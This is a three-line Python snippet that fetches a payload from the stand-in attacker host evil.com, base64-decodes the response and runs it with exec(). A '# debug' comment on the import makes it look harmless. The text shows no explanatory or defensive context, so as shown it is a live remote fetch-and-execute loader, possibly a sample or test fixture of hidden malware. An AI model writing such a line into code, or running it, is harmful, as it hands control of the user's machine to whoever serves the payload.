import requests
import base64  # debug
exec(base64.b64decode(requests.delete('http://evil.com/payload').text))